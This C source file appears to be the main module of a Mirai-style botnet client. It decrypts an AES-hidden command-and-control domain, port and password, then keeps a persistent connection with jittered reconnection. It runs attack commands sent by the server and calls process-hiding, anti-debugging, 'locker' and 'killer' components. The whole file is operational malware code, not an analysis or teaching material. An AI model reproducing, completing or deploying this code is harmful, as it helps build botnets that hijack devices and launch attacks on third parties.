#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stddef.h>

#include "headers/attack_params.h"
#include "headers/hide.h"
#include "headers/connection_lock.h"
#include "headers/manager.h"
#include "headers/locker.h"
#include "headers/killer.h"
#include "headers/resolv.h"
#include "headers/adbg.h"
#include "headers/config.h"
#include "headers/aes.h"

typedef enum {
    STATE_INIT,
    STATE_RESOLVING,
    STATE_CONNECTING,
    STATE_HANDSHAKING,
    STATE_CONNECTED,
    STATE_ERROR,
    STATE_BACKOFF
} connection_state_t;

typedef struct {
    int sock;
    struct sockaddr_in server_addr;
    int consecutive_failures;
    time_t last_successful_connect;
    time_t last_resolve_attempt;
    connection_state_t state;
    int retry_delay;
} connection_ctx_t;

int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
    int res, valopt;
    socklen_t lon;
    fd_set myset;
    struct timeval tv;

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags == -1) return -1;
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) == -1) return -1;

    res = connect(sock, addr, addrlen);
    if (res == 0) {
        fcntl(sock, F_SETFL, flags);
        return 0;
    }

    if (errno != EINPROGRESS) {
        fcntl(sock, F_SETFL, flags);
        return -1;
    }

    FD_ZERO(&myset);
    FD_SET(sock, &myset);
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;

    res = select(sock + 1, NULL, &myset, NULL, &tv);
    if (res <= 0) {
        fcntl(sock, F_SETFL, flags);
        return -1;
    }

    lon = sizeof(valopt);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &valopt, &lon) == -1 || valopt != 0) {
        fcntl(sock, F_SETFL, flags);
        return -1;
    }

    fcntl(sock, F_SETFL, flags);
    return 0;
}

int configure_socket(int sock) {
    int optval = 1;
    struct timeval timeout = {45, 0};

    if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) return -1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) return -1;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) return -1;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) return -1;

    #ifdef TCP_NODELAY
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
    #endif
    
    #ifdef TCP_KEEPIDLE
    int keepidle = 30;
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
    #endif
    
    #ifdef TCP_KEEPINTVL
    int keepintvl = 5;
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
    #endif
    
    #ifdef TCP_KEEPCNT
    int keepcnt = 3;
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
    #endif

    int sndbuf = 65535;
    int rcvbuf = 65535;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

    return 0;
}

int resolve_server_address(struct sockaddr_in *server_addr, int consecutive_failures) {
    static time_t last_successful_resolve = 0;
    static char cached_ip[INET_ADDRSTRLEN] = {0};
    static time_t cache_ttl = 0;
    
    time_t now = time(NULL);

    if (cached_ip[0] != 0 && now - last_successful_resolve < 300) {
        if (inet_pton(AF_INET, cached_ip, &server_addr->sin_addr) == 1) {
            return 1;
        }
    }

    char *decrypted_domain = aes_decrypt_hex_string(AES_KEY, CNC_DOMAIN);
    char *resolved_ip = resolv_with_retry(decrypted_domain);
    if (resolved_ip && inet_pton(AF_INET, resolved_ip, &server_addr->sin_addr) == 1) {
        strncpy(cached_ip, resolved_ip, INET_ADDRSTRLEN - 1);
        last_successful_resolve = now;
        free(decrypted_domain);
        return 1;
    }

    if (consecutive_failures > 5) {
        struct addrinfo hints, *result;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        int status = getaddrinfo(decrypted_domain, NULL, &hints, &result);
        if (status == 0) {
            struct sockaddr_in* addr_in = (struct sockaddr_in*)result->ai_addr;
            server_addr->sin_addr = addr_in->sin_addr;
            inet_ntop(AF_INET, &server_addr->sin_addr, cached_ip, INET_ADDRSTRLEN);
            last_successful_resolve = now;
            freeaddrinfo(result);
            free(decrypted_domain);
            return 1;
        }
        free(decrypted_domain);
        if (result) freeaddrinfo(result);
    }
    
    return 0;
}

int calculate_retry_delay(int consecutive_failures) {
    int base_delay;
    
    if (consecutive_failures <= 3) {
        base_delay = INITIAL_RETRY_DELAY;
    } else if (consecutive_failures <= 10) {
        base_delay = 15;
    } else if (consecutive_failures <= 20) {
        base_delay = 60;
    } else {
        base_delay = MAX_RETRY_DELAY;
    }

    int jitter = rand() % (base_delay / 2 + 1);
    int total_delay = base_delay + jitter;
    
    return total_delay;
}
int perform_handshake(int sock) {
    char handshake_data[40];
    
    char *decrypted_password = aes_decrypt_hex_string(AES_KEY, Password);
    snprintf(handshake_data, sizeof(handshake_data), "%s %s", BArch, decrypted_password);
    free(decrypted_password);
    for (int attempt = 0; attempt < HANDSHAKE_RETRIES; attempt++) {
        ssize_t sent = send(sock, handshake_data, strlen(handshake_data), MSG_NOSIGNAL);
        if (sent > 0) {
            return 0;
        }
        
        if (attempt < HANDSHAKE_RETRIES - 1) {
            sleep(1);
        }
    }

    return -1;
}

connection_state_t handle_connection_state(connection_ctx_t *ctx) {
    switch (ctx->state) {
        case STATE_INIT:
            ctx->state = STATE_RESOLVING;
            break;
            
        case STATE_RESOLVING:
            if (resolve_server_address(&ctx->server_addr, ctx->consecutive_failures)) {
                ctx->state = STATE_CONNECTING;
                ctx->last_resolve_attempt = time(NULL);
            } else {
                ctx->state = STATE_ERROR;
            }
            break;
            
        case STATE_CONNECTING:
            ctx->sock = socket(AF_INET, SOCK_STREAM, 0);
            if (ctx->sock == -1) {
                ctx->state = STATE_ERROR;
                break;
            }
            
            if (configure_socket(ctx->sock) == -1) {
                close(ctx->sock);
                ctx->sock = -1;
                ctx->state = STATE_ERROR;
                break;
            }
            
            int timeout = (ctx->consecutive_failures > 5) ? 10 : CONNECTION_TIMEOUT;
            if (connect_with_timeout(ctx->sock, (struct sockaddr*)&ctx->server_addr, 
                                   sizeof(ctx->server_addr), timeout) == 0) {
                ctx->state = STATE_HANDSHAKING;
            } else {
                close(ctx->sock);
                ctx->sock = -1;
                ctx->state = STATE_ERROR;
            }
            break;
            
        case STATE_HANDSHAKING:
            if (perform_handshake(ctx->sock) == 0) {
                ctx->state = STATE_CONNECTED;
                ctx->consecutive_failures = 0;
                ctx->last_successful_connect = time(NULL);
            } else {
                ctx->state = STATE_ERROR;
            }
            break;
            
        case STATE_CONNECTED:
            break;
            
        case STATE_ERROR:
            if (ctx->sock != -1) {
                shutdown(ctx->sock, SHUT_RDWR);
                close(ctx->sock);
                ctx->sock = -1;
            }
            ctx->consecutive_failures++;
            ctx->retry_delay = calculate_retry_delay(ctx->consecutive_failures);
            ctx->state = STATE_BACKOFF;
            break;
            
        case STATE_BACKOFF:
            sleep(ctx->retry_delay);

            if (ctx->consecutive_failures > 10) {
                time_t now = time(NULL);
                if (now - ctx->last_resolve_attempt > RESOLVE_RETRY_INTERVAL) {
                    ctx->state = STATE_RESOLVING;
                    break;
                }
            }
            
            ctx->state = STATE_CONNECTING;
            break;
    }
    
    return ctx->state;
}

int handle_communication(connection_ctx_t *ctx) {
    char command[1024];
    ssize_t n;
    time_t last_ping = time(NULL);
    int communication_errors = 0;
    
    while (ctx->state == STATE_CONNECTED) {
        struct pollfd fds;
        fds.fd = ctx->sock;
        fds.events = POLLIN;
        
        time_t now = time(NULL);

        if (now - last_ping >= PING_INTERVAL) {
            ssize_t sent = send(ctx->sock, "ping", 4, MSG_NOSIGNAL);
            if (sent <= 0) {
                communication_errors++;
                if (communication_errors >= COMM_ERROR_THRESHOLD) {
                    return -1;
                }
            } else {
                communication_errors = 0;
            }
            last_ping = now;
        }

        int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
        if (poll_timeout < 1000) poll_timeout = 1000;
        if (poll_timeout > 30000) poll_timeout = 30000;
        
        int ret = poll(&fds, 1, poll_timeout);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        
        if (ret == 0) {
            continue;
        }
        
        if (fds.revents & POLLIN) {
            n = recv(ctx->sock, command, sizeof(command) - 1, 0);
            if (n <= 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue;
                }
                communication_errors++;
                if (communication_errors >= COMM_ERROR_THRESHOLD) {
                    return -1;
                }
                continue;
            }
            
            communication_errors = 0;
            command[n] = 0;
            handle_command(command, ctx->sock);
            memset(command, 0, sizeof(command));
        }
        
        if (fds.revents & (POLLERR | POLLHUP | POLLNVAL)) {
            return -1;
        }

        if (time(NULL) - last_ping > (PING_INTERVAL * 3)) {
            return -1;
        }
    }
    
    return 0;
}

void cleanup_resources(int lock_fd) {
    stop_killer();
    cleanup_attack_threads();
    release_connection_lock(lock_fd);
}

int main(int argc __attribute__((unused)), char** argv __attribute__((unused))) {
    adbg();
    init_thread_states();

    hide(argc, argv);
    start_locker();
    start_killer();
    int lock_fd = acquire_connection_lock();
    if (lock_fd < 0) {
        return 0;
    }

    char *port_str = aes_decrypt_hex_string(AES_KEY, BOT_PORT);

    if (port_str == NULL)
        return 1;
    uint16_t port = (uint16_t)atoi(port_str);
    free(port_str);

    connection_ctx_t ctx = {
        .sock = -1,
        .server_addr = {.sin_family = AF_INET, .sin_port = htons(port)},
        .consecutive_failures = 0,
        .last_successful_connect = 0,
        .last_resolve_attempt = 0,
        .state = STATE_INIT,
        .retry_delay = INITIAL_RETRY_DELAY
    };

    srand(time(NULL));

    while (1) {
        connection_state_t current_state = handle_connection_state(&ctx);
        
        if (current_state == STATE_CONNECTED) {
            if (handle_communication(&ctx) == -1) {
                ctx.state = STATE_ERROR;
            }
        }
    }

    cleanup_resources(lock_fd);
    return 0;
}
